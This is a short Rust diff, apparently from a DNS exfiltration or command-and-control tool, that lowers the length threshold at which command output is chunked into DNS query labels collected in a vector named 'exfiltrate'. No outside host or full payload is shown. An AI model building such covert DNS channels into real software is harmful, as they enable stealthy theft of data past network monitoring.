@@ -90,8 +90,8 @@ pub fn construct_queries(output: &str, domain: &str) -> Vec<String> {
     let mut exfiltrate: Vec<String> = Vec::new();
     let mut current_group = String::new();
 
-    // If the output is less than 63 chars just construct the query and return it
-    if output.len() < 63 {
+    // If the output is less than 50 chars just construct the query and return it
+    if output.len() < 50 {
 
         // Adding this because of the stupid rule in the rust 
         // dns-server crate that every label needs to start with letter
